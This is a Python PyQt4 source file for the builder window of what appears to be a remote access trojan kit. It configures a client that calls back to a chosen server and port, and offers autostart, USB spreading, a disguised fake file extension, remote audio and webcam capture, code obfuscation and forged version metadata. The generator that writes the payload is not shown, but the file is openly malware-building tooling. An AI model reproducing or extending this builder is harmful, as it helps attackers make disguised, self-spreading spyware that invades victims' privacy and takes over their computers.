from ui.builder import Ui_Form as builderUi
from PyQt4.QtGui import *
from PyQt4.QtCore import *

import random
import string
import hashlib
import os

import linesnum
from language import Translate
from client_code_generator import SourceGenerator

# Multi Lang
translate = Translate()
_ = lambda _word: translate.word(_word)


class Builder(QWidget, builderUi):

    def __init__(self, args):
        QWidget.__init__(self)
        self.setupUi(self)

        # START: triggers
        # Client Configuration
        self.showPasswordButton.clicked.connect(self.set_password_echo_mode)
        self.generateRandomNameButton.clicked.connect(self.set_new_file_name)
        self.generateButton.clicked.connect(self.genereate_source)

        # Idle
        self.obfuscateButton.clicked.connect(self.obfuscate_code)
        self.saveButton.clicked.connect(self.save_code)
        self.backToOptionsButton.clicked.connect(self.back_to_client_configuration)
        self.nextToAssemblyButton.clicked.connect(self.next_to_assembly_editor)
        self.nextToOtherButton.clicked.connect(self.next_to_other)
        # END: triggers

        self.set_language()
        self.tabs_disable()
        self.toolBox.setCurrentIndex(0)

        # init idle with lines
        self.idle = linesnum.LineTextWidget()
        self.idleLayout.addWidget(self.idle)

    def set_language(self):

        # Window title
        self.setWindowTitle(_('BUILDER_TITLE'))

        # Client Configuration
        self.clientAddressLabel.setText(_('BUILDER_SERVER_ADDRESS_LABEL'))
        self.clientPortLabel.setText(_('BUILDER_SERVER_PORT_LABEL'))
        self.serverPasswordLabel.setText(_('BUILDER_CLIENT_PASSWORD_LABEL'))
        self.connectionTimeoutLabel.setText(_('BUILDER_TIMEOUT_LABEL'))
        self.fileNameLabel.setText(_('BUILDER_FILE_NAME_LABEL'))
        self.workingDirLabel.setText(_('BUILDER_WORKING_DIR_LABEL'))
        self.currentUserLabel.setText(_('BUILDER_CURRENT_USER_LABEL'))
        self.autostartCheck.setText(_('BUILDER_AUTOSTART_CHECK'))
        self.usbSpredingCheck.setText(_('BUILDER_USB_SPREADING_CHECK'))
        self.FakeGroup.setTitle(_('BUILDER_FAKE_CHECK'))
        self.fakeFileExtensionLabel.setText(_('BUILDER_FAKE_FILE_EXTENSION_LABEL'))

    def tabs_disable(self):
        self.toolBox.setItemEnabled(0, False)
        self.toolBox.setItemEnabled(1, False)
        self.toolBox.setItemEnabled(2, False)
        self.toolBox.setItemEnabled(3, False)

    # generate random file name
    def set_new_file_name(self):
        self.clientFileNameLine.setText(self.randomword())

    # show/hide password
    def set_password_echo_mode(self):
        if self.showPasswordButton.isChecked():
            self.serverPasswordLine.setEchoMode(QLineEdit.Normal)
        else:
            self.serverPasswordLine.setEchoMode(QLineEdit.Password)

    def randomword(self, length=0):
        while len(str(length)) < 2:
            length = int(random.choice(string.digits)) + int(random.choice(string.digits))
        return ''.join(random.choice(string.lowercase + string.uppercase + '_') for i in range(length))

    def check_server_address(self):
        return str(self.clientAdressLine.text())

    def check_port(self):
        return self.clientPortLine.text()

    def check_password(self):
        md5 = hashlib.md5()
        md5.update(str(self.serverPasswordLine.text()))
        return md5.hexdigest()

    def check_timeout(self):
        return str(self.connectionTimeoutLine.text())

    def check_working_dir(self):
        return str(self.workingDirLine.text())

    def check_file_name(self):
        return str(self.clientFileNameLine.text())

    def check_autorun(self):
        if self.autostartCheck.isChecked():
            return True
        else:
            return False

    def check_usb_spreading(self):
        if self.usbSpredingCheck.isChecked():
            return True
        else:
            return False

    def check_fake_file(self):
        if self.FakeGroup.isChecked():
            return True
        else:
            return False

    def check_fake_name(self):
        return str(self.fakeFileExtension.text())

    def check_remote_audio(self):
        if self.remoteAudioCheck.isChecked():
            return True
        else:
            return False

    def check_remote_webcam(self):
        if self.remoteWebcamCheck.isChecked():
            return True
        else:
            return False

    def genereate_source(self):
        generator = SourceGenerator()
        generator.set_ip_address(self.check_server_address())
        generator.set_port(self.check_port())
        generator.set_passkey(self.check_password())
        generator.set_timeout(self.check_timeout())
        generator.set_working_dir_name(self.check_working_dir())
        generator.set_file_name(self.check_file_name())
        generator.use_autostart(self.check_autorun())
        generator.use_usb_spreading(self.check_usb_spreading())
        generator.use_fake_file(self.check_fake_file())
        generator.set_fake_file_name(self.check_fake_name())
        generator.use_audio(self.check_remote_audio())
        generator.use_webcam(self.check_remote_webcam())

        # generate
        file_name = QFileDialog.getSaveFileName(self, _('BUILDER_SAVE_FILE_NAME'), '', 'Python File (*.py)')
        if file_name:
            try:
                generator.generate_source(file_name)
            except IOError:
                return
        self.source_file_name = str(file_name)
        self.source_file_dir = os.path.dirname(str(self.source_file_name))

        self.next_to_idle()

    # IDLE & Obfuscator
    def next_to_idle(self):
        if self.set_source_in_idle():
            self.toolBox.setCurrentIndex(1)

    def set_source_in_idle(self):
        try:
            with open(self.source_file_name, 'r') as source_file:
                self.idle.clearText()
                self.idle.appendText(source_file.read())
                return True
        except IOError:
            return False

    def obfuscate_code(self):
        generator = SourceGenerator()
        generator.obfuscate(self.source_file_name)
        self.set_source_in_idle()

    def back_to_client_configuration(self):
        self.toolBox.setCurrentIndex(0)

    def next_to_assembly_editor(self):
        self.toolBox.setCurrentIndex(2)

    def save_code(self):
        with open(self.source_file_name, 'w') as source_file:
            source_file.write(self.idle.getTextEdit())

    def generate_version_file(self):
        from libs.version_body import version_body
        values = {
            '{%CompanyName%}': str(self.asmCompanyNameLine.text()),
            '{%FileDescription%}': str(self.asmFileDescriptionLine.text()),
            '{%FileVersion%}': str(self.asmFileVersionLine.text()),
            '{%InternalName%}': str(self.asmFileNameLine.text()),
            '{%LegalCopyright%}': str(self.asmLegalCopyrightLine.text()),
            '{%ProductName%}': str(self.asmProductNameLine.text()),
            '{%ProductVersion%}': str(self.asmProductVersionLine.text()),
        }

        with open(os.path.join(self.source_file_dir, 'version.inf'), 'w') as version_file:
            version_file.write(self.format_body(version_body, values))

    def format_body(self, source, values):
        return reduce(lambda x, y: x.replace(y, values[y]), values, source)

    def back_to_idle(self):
        self.toolBox.setCurrentIndex(1)

    def next_to_other(self):
        self.generate_version_file()
        self.toolBox.setCurrentIndex(3)
